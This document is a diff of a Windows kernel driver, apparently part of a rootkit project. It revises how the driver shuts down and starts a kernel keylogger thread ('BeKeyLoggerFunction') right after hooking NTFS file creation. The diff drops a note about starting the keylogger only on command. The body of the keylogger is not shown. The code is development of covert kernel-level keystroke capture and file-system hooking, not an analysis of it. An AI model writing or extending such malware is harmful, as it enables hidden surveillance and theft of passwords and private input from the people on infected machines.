@@ -29,8 +29,10 @@ BeUnload(PDRIVER_OBJECT DriverObject)
 {
     LOG_MSG("Unload Called \r\n");
 
-    BeGlobals::runKeyLogger = false;
-    // Wait for keylogger to stop running TODO proper signaling
+    BeGlobals::shutdown = true;
+
+    // Wait for keylogger to stop running TODO: proper signaling
+    BeGlobals::logKeys = false;
     LARGE_INTEGER interval;
     interval.QuadPart = -1 * (LONGLONG)500 * 10000;
     KeDelayExecutionThread(KernelMode, FALSE, &interval);
@@ -207,9 +209,7 @@ DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
     NtStatus = BeHookNTFSFileCreate();
 #endif
 
-    // TODO: move to IOCTL and start only upon command
     // Start Keylogger Thread
-    BeGlobals::runKeyLogger = true;
     PKTHREAD ThreadObject;
     NtStatus = PsCreateSystemThread(&hKeyloggerThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, BeKeyLoggerFunction, NULL);
     if (NtStatus != 0)
